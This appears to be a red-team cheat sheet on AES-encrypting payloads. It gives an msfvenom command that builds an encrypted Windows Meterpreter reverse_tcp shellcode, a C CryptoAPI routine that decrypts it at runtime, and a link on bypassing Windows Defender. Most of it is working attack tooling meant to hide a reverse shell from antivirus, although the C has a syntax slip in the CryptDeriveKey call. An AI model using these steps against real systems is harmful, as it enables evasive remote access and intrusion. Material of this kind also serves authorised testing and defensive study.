# AES

## #metasploit 

> [!NOTE]
> For AES256 encryption that the key (using flag `--encrypt-key`) must be exactly 32 bytes of length and the IV (using flag `--encrypt-iv`) must be 16 bytes of length.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt aes256 --encrypt-key 0123456789abcdefghijklmnopqrstuv --encrypt-iv 1234567890abcdef -f c -o payload_aes.c
```

## C

```c
void DecryptAES(char *data, DWORD length, char *key, DWORD key_length) {
    HCRYPTPROV handle_prov;
    HCRYPTHASH handle_hash;
    HCRYPTKEY handle_key;

    CryptAcquireContextW(&handle_prov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(handle_prov, CALG_SHA_256, 0, 0, &handle_hash);
    CryptHashData(handle_hash, (BYTE*) key, key_length, 0);
    CryptDeriveKey(handle_prov, CALG_AES_256), handle_hash, 0, &handle_key);
    CryptDecrypt(handle_key, (HCRYPTHASH) NULL, 0, 0, (BYTE*)data, &length);

    CryptReleaseContext(handle_prov, 0);
    CryptDestroyHash(handle_hash);
    CryptDestroyKey(handle_key);
}
```

---
## References

### Secarma

- [secarma: Bypassing Windows Defender with Environmental Decryption Keys](https://secarma.com/bypassing-windows-defender-with-environmental-decryption-keys/)